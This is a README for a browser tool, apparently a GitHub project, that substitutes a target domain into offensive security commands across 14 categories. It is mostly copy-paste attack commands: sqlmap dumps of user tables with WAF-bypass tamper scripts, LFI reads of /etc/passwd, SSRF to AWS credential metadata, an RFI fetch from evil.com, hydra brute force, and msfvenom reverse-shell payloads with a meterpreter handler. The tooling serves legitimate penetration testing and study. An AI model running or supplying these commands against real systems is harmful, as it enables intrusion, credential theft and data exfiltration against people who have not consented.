<div align="center">

```
 ██████╗██╗   ██╗██████╗ ███████╗██████╗     ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
```

### ☠️ &nbsp; T 0 0 L K I T &nbsp; ☠️

**A browser-based cybersecurity command generation engine for bug bounty hunters, penetration testers, and security researchers.**

[![Live](https://img.shields.io/badge/🌐%20LIVE%20DEMO-cybersec--toolkit.netlify.app-00ff41?style=for-the-badge&logoColor=black)](https://cybersec-toolkit.netlify.app/)
[![License](https://img.shields.io/badge/License-MIT-00ff41?style=for-the-badge)](LICENSE)
[![Netlify Status](https://img.shields.io/badge/Netlify-Deployed-00ff41?style=for-the-badge&logo=netlify&logoColor=black)](https://cybersec-toolkit.netlify.app/)
[![No Backend](https://img.shields.io/badge/Backend-None-00ff41?style=for-the-badge)](https://cybersec-toolkit.netlify.app/)
[![Tools](https://img.shields.io/badge/Tools-50%2B-00ff41?style=for-the-badge)]()
[![Categories](https://img.shields.io/badge/Categories-14%2B-00ff41?style=for-the-badge)]()
[![Commands](https://img.shields.io/badge/Commands-100%2B-00ff41?style=for-the-badge)]()
[![Attacks](https://img.shields.io/badge/Attack%20Techniques-150%2B-00ff41?style=for-the-badge)]()

</div>

---

## 📖 Table of Contents

- [What Is This?](#-what-is-this)
- [Live Demo](#-live-demo)
- [How It Works](#-how-it-works)
- [User Interface](#-user-interface)
- [Stats at a Glance](#-stats-at-a-glance)
- [Attack Categories — Full Breakdown](#-attack-categories--full-breakdown)
  - [1. Subdomain Enumeration](#1-subdomain-enumeration)
  - [2. Port Scanning & Network Recon](#2-port-scanning--network-recon)
  - [3. Web Fuzzing & Directory Bruteforce](#3-web-fuzzing--directory-bruteforce)
  - [4. OSINT & Passive Reconnaissance](#4-osint--passive-reconnaissance)
  - [5. SQL Injection](#5-sql-injection)
  - [6. XSS & JavaScript Injection](#6-xss--javascript-injection)
  - [7. SSRF / LFI / RFI](#7-ssrf--lfi--rfi)
  - [8. Cloud Reconnaissance](#8-cloud-reconnaissance-awsgcpazure)
  - [9. API Testing](#9-api-testing)
  - [10. Vulnerability Scanning](#10-vulnerability-scanning)
  - [11. Crawling & URL Discovery](#11-crawling--url-discovery)
  - [12. Password & Authentication Attacks](#12-password--authentication-attacks)
  - [13. Exploitation Helpers](#13-exploitation-helpers)
  - [14. Network Recon](#14-network-recon)
- [UI Features — Deep Dive](#-ui-features--deep-dive)
- [Running Locally](#-running-locally)
- [Project Structure](#-project-structure)
- [Use Cases](#-use-cases)
- [Ethical & Legal Use](#-ethical--legal-use)
- [Contributing](#-contributing)
- [License](#-license)

---

## 🔍 What Is This?

**Cyber Recon T00lkit** is a fully client-side, browser-based cybersecurity command generation platform. It is designed to eliminate the friction of remembering exact tool syntax during active security engagements. Instead of switching between documentation tabs, cheat sheets, and wikis, you enter your target domain **once** — and the toolkit instantly generates exploit-ready, properly formatted terminal commands across **14+ attack categories** and **50+ industry-standard tools**.

There is no backend, no login, no data collection, and no external API calls. Every command is built and rendered entirely in your browser using JavaScript. Your target domain never leaves your machine.

This tool was purpose-built for:

- 🕵️ **Bug bounty hunters** who need fast, accurate recon command generation across multiple tools
- 🔴 **Penetration testers** who want structured attack checklists with correct syntax
- 🎓 **Security students & CTF players** who are learning tool usage and attack methodologies
- 🛠️ **Automation developers** who want a reference for building their own recon pipelines

---

## 🌐 Live Demo

> **[https://cybersec-toolkit.netlify.app/](https://cybersec-toolkit.netlify.app/)**

No installation. No sign-up. Open the link, enter a domain, and start generating commands.

---

## ⚙️ How It Works

The workflow is intentionally simple and designed for speed:

```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│   1. Open the toolkit in any browser                        │
│                                                             │
│   2. Enter your target domain in the input field           │
│      e.g.  target.com                                       │
│                                                             │
│   3. The toolkit instantly populates 100+ commands          │
│      across all 14 attack categories — with your           │
│      domain already substituted into every command          │
│                                                             │
│   4. Browse categories, search, copy individual            │
│      commands or export the full set                        │
│                                                             │
│   5. Run the commands in your terminal                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Key principle:** Every command displayed is **exploit-ready** — your target is injected directly into the command string, so you never have to manually replace placeholder values. Copy. Paste. Run.

---

## 🖥️ User Interface

The entire interface is built around a **dark terminal aesthetic** — green-on-black color palette, monospace fonts, and a hacker-console visual language that prioritizes speed and readability in low-light environments.

### Target Input Bar
The primary entry point of the tool. A prominent domain input field sits at the top of the page. As you type your target domain (`example.com`), every single command across all categories is dynamically updated in real time — no submit button needed.

### Category Navigation
All 14 attack categories are laid out as navigable sections. Users can either scroll through the full list or use the **search/filter** functionality to jump directly to a specific category or tool name.

### Command Cards
Each tool is displayed as a command card containing:
- The **tool name** and what it does
- The **full terminal command** with the target domain already embedded
- A **one-click copy button** to copy the exact command to clipboard
- Optional **install instructions** so users know how to get the tool if not already installed

### Search & Filter
A live search bar lets you filter by tool name, technique, or keyword across all categories simultaneously. Searching `nuclei` instantly surfaces every nuclei-related command; searching `xss` brings up all XSS-related commands across categories.

### Stats Counter
A live stats panel displays:

| Stat | Count |
|---|---|
| Tools covered | 50+ |
| Commands generated | 100+ |
| Attack categories | 14+ |
| Advanced attack techniques | 150+ |

### Copy-to-Clipboard
Every command has its own dedicated copy button. Clicking it copies the exact command — with your domain substituted in — directly to your clipboard. A visual confirmation indicator fires to confirm the copy was successful.

### Export / Download Commands
The full generated command set can be exported and downloaded as a file, giving you an offline reference or a starting point for automation scripts.

### Tool Install Instructions
Where relevant, each command card surfaces the installation command for that tool — so junior testers or students can go from zero to running in a single screen without Googling.

### Mobile Responsive
The entire toolkit is fully responsive and usable on mobile devices — useful for quick reference during field engagements or on-the-go lookups.

---

## 📊 Stats at a Glance

| Metric | Value |
|---|---|
| 🛠️ Tools | 50+ |
| 💻 Commands | 100+ |
| 🗂️ Categories | 14+ |
| ⚡ Attack Techniques | 150+ |
| 🔗 Backend dependencies | 0 |
| 📦 Installation required | None |
| 🌐 Works offline (after load) | ✅ |
| 🔐 Data sent to any server | ❌ Never |

---

## 🗂️ Attack Categories — Full Breakdown

Every category below is available inside the toolkit. Each generates multiple tool commands with your target domain pre-filled.

---

### 1. Subdomain Enumeration

Subdomain enumeration is typically the first step in any external bug bounty engagement. Expanding the attack surface by discovering all subdomains increases the chances of finding forgotten assets, staging environments, and misconfigured services.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `amass` | Comprehensive attack surface mapping with passive and active enum |
| `subfinder` | Fast passive subdomain discovery using many sources |
| `assetfinder` | Lightweight subdomain discovery from certificate logs and more |
| `findomain` | Cross-platform subdomain finder with monitor mode |
| `dnsx` | DNS toolkit for resolving and filtering subdomain lists |
| `puredns` | High-performance DNS bruteforce and resolution |
| `shuffledns` | Mass DNS resolver using massdns under the hood |
| `sublist3r` | Python-based subdomain enumeration using multiple search engines |

**Example commands generated:**

```bash
# amass — active + passive
amass enum -d target.com -o amass_target.com.txt

# subfinder — passive, all sources
subfinder -d target.com -all -o subfinder_target.com.txt

# assetfinder
assetfinder --subs-only target.com

# findomain
findomain -t target.com -u findomain_target.com.txt

# dnsx — resolve and filter live subdomains
cat subfinder_target.com.txt | dnsx -resp -o live_subs.txt

# puredns bruteforce
puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt target.com

# shuffledns
shuffledns -d target.com -list subdomains.txt -r resolvers.txt
```

---

### 2. Port Scanning & Network Recon

After subdomain enumeration, port scanning identifies which services are exposed and where potential attack vectors exist — open admin panels, non-standard ports, legacy services, and more.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `nmap` | The gold-standard port scanner with service detection and NSE scripts |
| `masscan` | Extremely fast TCP port scanner for large IP ranges |
| `rustscan` | Modern ultra-fast scanner that hands off to nmap for service detection |
| `naabu` | Fast port scanner by ProjectDiscovery, integrates with subfinder |

**Example commands generated:**

```bash
# nmap — full service + script scan
nmap -sV -sC -p- --open -T4 target.com -oA nmap_target

# nmap — top 1000 ports, aggressive
nmap -A -T4 target.com

# nmap — UDP scan (top ports)
nmap -sU --top-ports 200 target.com

# masscan — full port sweep
masscan -p1-65535 target.com --rate=10000 -oL masscan_target.txt

# rustscan — fast open port discovery then nmap
rustscan -a target.com -- -sV -sC

# naabu — fast port scan with nmap integration
naabu -host target.com -p - -nmap-cli 'nmap -sV -sC'
```

---

### 3. Web Fuzzing & Directory Bruteforce

Directory and file fuzzing uncovers hidden endpoints, backup files, admin panels, configuration files, and other sensitive paths not linked from the main application.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `ffuf` | The most versatile web fuzzer — directory, parameter, header, vhost fuzzing |
| `gobuster` | Fast directory/file bruteforcer in Go |
| `feroxbuster` | Recursive content discovery with smart filtering |
| `dirsearch` | Python-based recursive web path scanner |
| `wfuzz` | Flexible web fuzzer supporting complex injection points |

**Example commands generated:**

```bash
# ffuf — directory brute
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -o ffuf_dir.json

# ffuf — vhost fuzzing
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -fs 0

# ffuf — GET parameter fuzzing
ffuf -u "https://target.com/page?FUZZ=value" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# gobuster — dir mode
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak

# gobuster — DNS mode
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# feroxbuster — recursive with depth
feroxbuster --url https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 3 -x php,html,js

# dirsearch
python3 dirsearch.py -u https://target.com -e php,html,js,txt,bak,zip -r

# wfuzz — directory brute
wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 https://target.com/FUZZ
```

---

### 4. OSINT & Passive Reconnaissance

Passive recon gathers intelligence about the target without sending a single packet to their infrastructure — reducing the chance of detection and building a profile before active testing begins.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `theHarvester` | Email, subdomain, and employee info gathering from public sources |
| `recon-ng` | Full-featured OSINT framework with modular workflows |
| `shodan` CLI | Query the Shodan search engine for exposed services on the target's IPs |
| `censys` | Internet-wide scanning data — find TLS certs, open ports, services |
| `whois` | Domain registration info, registrar, nameservers, contact data |
| `dnsdumpster` | DNS zone mapping and visual network mapper |
| `waybackurls` | Pull all archived URLs for a domain from the Wayback Machine |
| `gau` | Fetch known URLs from AlienVault OTX, Wayback Machine, Common Crawl |

**Example commands generated:**

```bash
# theHarvester — multi-source passive recon
theHarvester -d target.com -l 500 -b all

# theHarvester — specific sources
theHarvester -d target.com -b google,bing,crtsh,dnsdumpster

# whois
whois target.com

# shodan CLI
shodan search hostname:target.com
shodan search org:"Target Corp"

# waybackurls — pull all archived URLs
echo "target.com" | waybackurls | tee wayback_target.txt

# gau — fetch known URLs
gau target.com | tee gau_target.txt

# gau — filter by extension
gau target.com | grep -E "\.(js|json|php|asp|aspx|xml)$"

# crt.sh — certificate transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value' | sed 's/\*\.//g' | sort -u
```

---

### 5. SQL Injection

SQL injection remains one of the most critical web application vulnerabilities. This category covers both automated detection and manual exploitation techniques.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `sqlmap` | The most powerful automated SQLi detection and exploitation tool |
| `ghauri` | Advanced SQLi tool, successor in some workflows to sqlmap |

**Example commands generated:**

```bash
# sqlmap — basic scan on URL
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# sqlmap — enumerate databases
sqlmap -u "https://target.com/page?id=1" --dbs --batch

# sqlmap — dump a specific database
sqlmap -u "https://target.com/page?id=1" -D database_name --tables --batch

# sqlmap — dump table data
sqlmap -u "https://target.com/page?id=1" -D database_name -T users --dump --batch

# sqlmap — via POST request
sqlmap -u "https://target.com/login" --data="username=admin&password=test" --batch --dbs

# sqlmap — from Burp request file
sqlmap -r request.txt --batch --level=5 --risk=3

# sqlmap — bypass WAF with tamper scripts
sqlmap -u "https://target.com/?id=1" --tamper=space2comment,between --batch

# sqlmap — crawl mode
sqlmap -u "https://target.com" --crawl=3 --batch --dbs

# sqlmap — with cookie auth
sqlmap -u "https://target.com/app?id=1" --cookie="session=abc123" --batch --dbs

# ghauri
ghauri -u "https://target.com/?id=1" --dbs --batch
```

---

### 6. XSS & JavaScript Injection

Cross-site scripting vulnerabilities are among the most common web application flaws. This category generates detection and exploitation commands for reflected, stored, and DOM-based XSS.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `dalfox` | Fast, powerful XSS scanner with parameter crawling and DOM analysis |
| `XSStrike` | Advanced XSS detection tool with fuzzing and WAF bypass |
| `kxss` | Filter parameters that reflect unfiltered special characters |

**Example commands generated:**

```bash
# dalfox — basic scan
dalfox url "https://target.com/search?q=test"

# dalfox — with all parameters
dalfox url "https://target.com/search?q=test" --follow-redirects

# dalfox — scan from URL list
cat urls.txt | dalfox pipe

# dalfox — blind XSS with callback
dalfox url "https://target.com/?q=test" --blind "https://your-callback.xss.ht"

# dalfox — with custom header
dalfox url "https://target.com/?q=test" -H "Authorization: Bearer TOKEN"

# XSStrike — basic
python3 XSStrike.py -u "https://target.com/search?q=test"

# XSStrike — crawl + XSS
python3 XSStrike.py -u "https://target.com" --crawl --blind

# kxss — find params that reflect unfiltered chars
cat urls.txt | kxss

# Manual payload test via curl
curl -s "https://target.com/search?q=<script>alert(1)</script>"

# DOM XSS sources via gau + grep
gau target.com | grep -E "=|%3D" | kxss
```

---

### 7. SSRF / LFI / RFI

Server-Side Request Forgery, Local File Inclusion, and Remote File Inclusion are a class of vulnerabilities that abuse how the server fetches or processes external resources. These can lead to internal network access, credential theft, and full RCE.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `ffuf` | Fuzz SSRF and LFI parameters with payload wordlists |
| `gopherus` | Generate SSRF exploit payloads for internal service abuse |
| `interactsh` | OOB (out-of-band) interaction server for blind SSRF detection |
| Manual `curl` | Direct payload testing |

**Example commands generated:**

```bash
# LFI — path traversal fuzzing with ffuf
ffuf -u "https://target.com/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200

# LFI — common traversal payloads
curl "https://target.com/page?file=../../../../etc/passwd"
curl "https://target.com/page?file=....//....//....//etc/passwd"
curl "https://target.com/page?file=%2F%2F%2F%2Fetc%2Fpasswd"

# SSRF — basic internal host probe
curl "https://target.com/fetch?url=http://127.0.0.1:80"
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# SSRF — fuzzing with ffuf
ffuf -u "https://target.com/fetch?url=FUZZ" -w /usr/share/seclists/SSRF/SSRF-Testing.txt

# SSRF — OOB detection with interactsh
ffuf -u "https://target.com/fetch?url=FUZZ" -w /usr/share/seclists/SSRF/SSRF-Testing.txt
# replace FUZZ with your interactsh URL to detect blind SSRF

# gopherus — generate SSRF payload for Redis
python3 gopherus.py --exploit redis

# gopherus — for MySQL
python3 gopherus.py --exploit mysql

# RFI — remote file inclusion test
curl "https://target.com/page?file=http://evil.com/shell.txt"

# SSRF to AWS metadata
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

---

### 8. Cloud Reconnaissance (AWS/GCP/Azure)

Cloud misconfigurations are a massive and growing bug bounty category. Exposed S3 buckets, open GCS buckets, misconfigured IAM roles, and leaked cloud credentials regularly yield high-severity findings.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `cloudenum` | Enumerate cloud resources across AWS, GCP, and Azure |
| `s3scanner` | Scan for misconfigured S3 buckets |
| `awsbucketdump` | Enumerate and dump publicly accessible S3 buckets |
| `grayhatwarfare` | API for finding exposed cloud storage buckets |
| `aws` CLI | Direct AWS enumeration and credential testing |
| `gcloud` CLI | GCP enumeration |
| `az` CLI | Azure enumeration |

**Example commands generated:**

```bash
# cloudenum — scan all major clouds
python3 cloud_enum.py -k target -k targetcorp -k target-corp --disable-azure

# S3Scanner — check for open buckets
python3 s3scanner.py --bucket target
python3 s3scanner.py --bucket target-dev
python3 s3scanner.py --bucket target-backup
python3 s3scanner.py --bucket target-assets

# awsbucketdump
python AWSBucketDump.py -D -l BucketNames.txt -g interesting_Keywords.txt

# Check if bucket is public
aws s3 ls s3://target --no-sign-request
aws s3 cp s3://target/. . --recursive --no-sign-request

# AWS — enumerate with credentials
aws sts get-caller-identity
aws s3 ls --region us-east-1
aws ec2 describe-instances
aws iam list-users
aws iam list-roles
aws secretsmanager list-secrets

# GCP — list buckets
gsutil ls gs://target
gsutil ls -la gs://target

# Azure — enumerate storage
az storage account list
az storage blob list --account-name target --container-name files

# Bucket naming permutations to try
# target, target-dev, target-prod, target-backup, target-assets, target-media,
# target-logs, target-data, target-uploads, target-static, target-public
```

---

### 9. API Testing

Modern applications heavily rely on REST and GraphQL APIs, which introduce unique attack surfaces — broken object-level authorization, mass assignment, unauthenticated endpoints, and information disclosure.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `ffuf` | Fuzz API endpoints, parameters, and authentication headers |
| `arjun` | HTTP parameter discovery for API endpoints |
| `kiterunner` | API endpoint bruteforce specifically designed for REST APIs |
| `graphqlmap` | GraphQL endpoint enumeration and exploitation |
| `curl` | Manual API request crafting with headers and payloads |

**Example commands generated:**

```bash
# arjun — discover hidden API parameters
arjun -u "https://api.target.com/v1/user" -m GET
arjun -u "https://api.target.com/v1/user" -m POST

# kiterunner — API endpoint bruteforce
kr scan https://api.target.com -w routes-small.kite
kr scan https://api.target.com -w /usr/share/kiterunner/routes-large.kite

# ffuf — API path fuzzing
ffuf -u "https://api.target.com/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,400,401,403

# ffuf — API version fuzzing
ffuf -u "https://api.target.com/FUZZ/users" -w versions.txt

# graphqlmap — enumerate schema
python3 graphqlmap.py -u "https://target.com/graphql" --dump-new

# graphqlmap — introspection
python3 graphqlmap.py -u "https://target.com/graphql" --introspection

# curl — test BOLA (Broken Object Level Auth)
curl -H "Authorization: Bearer USER_A_TOKEN" https://api.target.com/v1/user/USER_B_ID

# curl — test mass assignment
curl -X POST https://api.target.com/v1/user/update \
  -H "Content-Type: application/json" \
  -d '{"username":"test","role":"admin","is_admin":true}'

# curl — unauthenticated API access
curl -s https://api.target.com/v1/users
curl -s https://api.target.com/v1/admin

# Look for API docs exposure
ffuf -u "https://target.com/FUZZ" -w api_docs_paths.txt
# e.g. /swagger, /api-docs, /openapi.json, /redoc, /graphql
```

---

### 10. Vulnerability Scanning

Automated vulnerability scanners check for known CVEs, misconfigurations, and security weaknesses across web applications and network services at scale.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `nuclei` | Template-based vulnerability scanner — industry standard for bug bounty |
| `nikto` | Classic web server vulnerability scanner |
| `wpscan` | WordPress-specific vulnerability and user enumeration scanner |
| `testssl.sh` | TLS/SSL configuration analysis and vulnerability checker |

**Example commands generated:**

```bash
# nuclei — full scan with all templates
nuclei -u https://target.com -t nuclei-templates/ -o nuclei_output.txt

# nuclei — critical and high only
nuclei -u https://target.com -severity critical,high -o nuclei_critical.txt

# nuclei — specific template categories
nuclei -u https://target.com -t cves/ -t exposures/ -t misconfiguration/

# nuclei — from subdomain list
nuclei -l live_subs.txt -t nuclei-templates/ -severity critical,high,medium -o nuclei_all.txt

# nuclei — with custom headers (bypass auth)
nuclei -u https://target.com -H "Authorization: Bearer TOKEN" -t nuclei-templates/

# nuclei — with rate limiting
nuclei -u https://target.com -t nuclei-templates/ -rate-limit 100 -bulk-size 25

# nikto — basic web server scan
nikto -h https://target.com

# nikto — with SSL
nikto -h target.com -ssl -port 443

# nikto — output to file
nikto -h https://target.com -o nikto_target.txt -Format txt

# wpscan — enumerate WordPress
wpscan --url https://target.com --enumerate u,vp,vt,tt,cb,dbe

# wpscan — with API token for vuln data
wpscan --url https://target.com --api-token YOUR_TOKEN --enumerate vp

# testssl.sh — full TLS audit
./testssl.sh https://target.com

# testssl.sh — check for specific vulns
./testssl.sh --heartbleed --poodle --beast https://target.com
```

---

### 11. Crawling & URL Discovery

Web crawling discovers the full set of URLs, endpoints, parameters, and paths within a target application — essential for finding injection points, forgotten endpoints, and hidden functionality.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `katana` | Next-gen web crawler by ProjectDiscovery with active and passive modes |
| `hakrawler` | Fast Go-based web crawler for recon pipelines |
| `gau` | Fetch known URLs from multiple historical sources |
| `waybackurls` | Pull all Wayback Machine URLs for a domain |
| `gospider` | Fast web spider written in Go |
| `linkfinder` | Find endpoints in JavaScript files |

**Example commands generated:**

```bash
# katana — active crawl
katana -u https://target.com -d 5 -o katana_output.txt

# katana — with JS crawling (headless)
katana -u https://target.com -d 5 -jc -o katana_js.txt

# katana — crawl all subdomains from list
katana -list live_subs.txt -d 3 -o katana_all.txt

# hakrawler — basic crawl
echo "https://target.com" | hakrawler

# hakrawler — depth 3, all resources
echo "https://target.com" | hakrawler -d 3 -subs

# gau — fetch all known URLs
gau target.com | tee gau_target.txt

# gau — filter interesting extensions
gau target.com | grep -E "\.(php|asp|aspx|jsp|json|xml|config|bak|old|sql|env)$"

# gau — find parameters
gau target.com | grep "?" | sort -u | tee params_target.txt

# waybackurls
echo "target.com" | waybackurls | tee wayback_target.txt

# gospider
gospider -s "https://target.com" -o output -d 3 --sitemap

# linkfinder — extract endpoints from JS
python3 linkfinder.py -i https://target.com/js/app.js -o cli

# Find all JS files from gau, then linkfinder
gau target.com | grep "\.js$" | while read url; do python3 linkfinder.py -i "$url" -o cli; done
```

---

### 12. Password & Authentication Attacks

Authentication weaknesses — weak passwords, default credentials, lack of rate limiting, and account lockout failures — are common and often yield account takeovers.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `hydra` | Fast multi-protocol login bruteforcer (HTTP, SSH, FTP, RDP, and more) |
| `medusa` | Parallel network login auditor |
| `ffuf` | HTTP form-based login bruteforce and credential stuffing |
| `patator` | Flexible bruteforce tool with module-based design |

**Example commands generated:**

```bash
# hydra — HTTP POST login brute
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# hydra — SSH brute
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target.com ssh

# hydra — FTP brute
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target.com

# hydra — HTTP basic auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-get /admin

# hydra — with rate limiting (slow/safe)
hydra -L users.txt -P passwords.txt -t 4 -W 3 target.com http-post-form "/login:user=^USER^&pass=^PASS^:error"

# ffuf — login brute via POST
ffuf -u "https://target.com/login" -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc 302,200 -fr "Invalid"

# ffuf — username enumeration
ffuf -u "https://target.com/login" -X POST \
  -d "username=FUZZ&password=wrongpassword" \
  -w /usr/share/seclists/Usernames/Names/names.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mr "User not found"

# medusa — HTTP brute
medusa -h target.com -U users.txt -P passwords.txt -M http -m DIR:/login

# Default credential check
# Always manually test: admin/admin, admin/password, admin/target, root/root
```

---

### 13. Exploitation Helpers

Exploitation helper commands assist in post-discovery phases — confirming vulnerabilities, generating payloads, searching for public exploits, and establishing proof-of-concept impact.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `searchsploit` | Search the Exploit-DB database for known public exploits |
| `metasploit` | Full exploitation framework — auxiliary, exploit, and post modules |
| `msfvenom` | Payload generation for various platforms and formats |
| `curl` | Manual HTTP request crafting for PoC testing |

**Example commands generated:**

```bash
# searchsploit — find exploits for a product
searchsploit apache 2.4
searchsploit wordpress 5.6
searchsploit target_cms_name

# searchsploit — copy exploit locally
searchsploit -m 12345

# metasploit — start and search
msfconsole
msf> search type:exploit name:target_service

# metasploit — use a module
msf> use exploit/multi/handler
msf> set PAYLOAD php/meterpreter/reverse_tcp
msf> set LHOST YOUR_IP
msf> set LPORT 4444
msf> run

# msfvenom — PHP reverse shell payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw > shell.php

# msfvenom — Windows exe payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe

# msfvenom — encoded Linux payload
msfvenom -p linux/x86/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -e x86/shikata_ga_nai -i 5 > shell.elf

# curl — manual PoC for common vulns
# Test for open redirect
curl -v "https://target.com/redirect?url=https://evil.com"

# Test for host header injection
curl -H "Host: evil.com" https://target.com -v

# Test for CORS misconfiguration
curl -H "Origin: https://evil.com" https://target.com/api/user -v
```

---

### 14. Network Recon

Network-level reconnaissance maps the infrastructure around the target — AS numbers, IP ranges, BGP peers, DNS records, certificate data, and infrastructure metadata.

**Tools covered:**

| Tool | Purpose |
|---|---|
| `dig` | Comprehensive DNS record querying |
| `nslookup` | Quick DNS lookups and record resolution |
| `dnsrecon` | Advanced DNS enumeration and zone transfer attempts |
| `dnsx` | Fast, multi-purpose DNS toolkit for bulk queries |
| `fierce` | DNS brute force and zone transfer scanner |
| `nmap` NSE scripts | Network-level service fingerprinting and script scanning |

**Example commands generated:**

```bash
# dig — all record types
dig target.com ANY
dig target.com A
dig target.com MX
dig target.com NS
dig target.com TXT
dig target.com AAAA
dig target.com CNAME

# dig — zone transfer attempt
dig axfr @ns1.target.com target.com

# dnsrecon — full recon
dnsrecon -d target.com -t std,axfr,brt,goo,snoop

# dnsrecon — bruteforce
dnsrecon -d target.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# dnsx — query multiple record types
echo "target.com" | dnsx -a -aaaa -cname -mx -ns -txt -resp

# dnsx — bulk resolution
cat subdomains.txt | dnsx -a -resp-only -o resolved_ips.txt

# fierce — DNS brute
fierce --domain target.com --wordlist /usr/share/fierce/hosts.txt

# nmap NSE — DNS enumeration scripts
nmap --script dns-brute target.com
nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=target.com -p 53 ns1.target.com

# Check for zone transfer manually
host -l target.com ns1.target.com

# nslookup — reverse lookup
nslookup IP_ADDRESS
```

---

## 🎨 UI Features — Deep Dive

### 🖤 Dark Terminal Theme
The entire UI is styled with a hacker terminal aesthetic — black backgrounds, bright green (`#00ff41`) accent text, monospace fonts, and a command-line visual language. Designed to reduce eye strain during long recon sessions and feel native to the security practitioner's environment.

### 🎯 Domain Input — Dynamic Substitution
The target domain input field is wired to every single command rendered on the page. The moment you type your domain, JavaScript updates all command strings in real time, substituting your target into every flag and parameter. There is no "Generate" button — commands update live as you type.

### 🔎 Search & Filter
A search bar at the top of the category listing filters all 14 categories and 50+ tools in real time. You can search by:
- Tool name (e.g., `nuclei`, `ffuf`)
- Category name (e.g., `ssrf`, `cloud`)
- Technique keyword (e.g., `blind`, `oob`, `brute`)

Results update instantly as you type.

### 📋 One-Click Copy
Every command card has a dedicated **copy** button. Clicking it:
1. Copies the exact command (with your target substituted) to clipboard
2. Flashes a visual confirmation indicator ("Copied!")
3. Resets after a short delay

No text selection, no right-click — one click and it's in your clipboard.

### 📤 Export / Download
The full generated command set across all categories can be exported as a downloadable file. Use this to:
- Save a recon checklist for a specific engagement
- Import into a notes tool (Obsidian, Notion, CherryTree)
- Feed into automation scripts

### 📦 Install Instructions
Each tool card optionally surfaces the installation command so you can go from seeing an unfamiliar tool to having it installed in seconds:

```bash
# Example install hints shown in the UI
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
pip3 install sqlmap
go install github.com/ffuf/ffuf/v2@latest
```

### 📊 Stats Counter
A live metrics panel displays the toolkit's coverage at a glance — tools, commands, categories, and attack techniques — giving immediate confidence in the tool's scope.

### 📱 Mobile Responsive
The layout is fully responsive with a mobile-first CSS approach. Every feature — search, copy, category browsing — works on smartphones and tablets. Useful for on-the-go reference during engagements, conferences, or while following a methodology on a second device.

---

## 🚀 Running Locally

No dependencies. No package manager. No build step.

```bash
# 1. Clone the repository
git clone https://github.com/YOUR_USERNAME/cyber-recon-toolkit.git

# 2. Navigate into the folder
cd cyber-recon-toolkit

# 3a. Open directly in browser
open index.html          # macOS
xdg-open index.html      # Linux

# 3b. OR serve with Python
python3 -m http.server 8080
# Visit: http://localhost:8080

# 3c. OR serve with Node
npx serve .
# Visit: http://localhost:3000
```

---

## 📁 Project Structure

```
cyber-recon-toolkit/
│
├── index.html              # Main app entry point — full UI lives here
├── style.css               # Dark terminal theme, layout, responsive styles
├── script.js               # Core logic: domain injection, command generation,
│                           #   copy-to-clipboard, search/filter, export
│
├── assets/
│   └── icons/              # Favicon, logo assets
│
├── netlify.toml            # Netlify config: security headers, SPA redirect rules
│
├── README.md               # This file
├── CONTRIBUTING.md         # Contribution guidelines
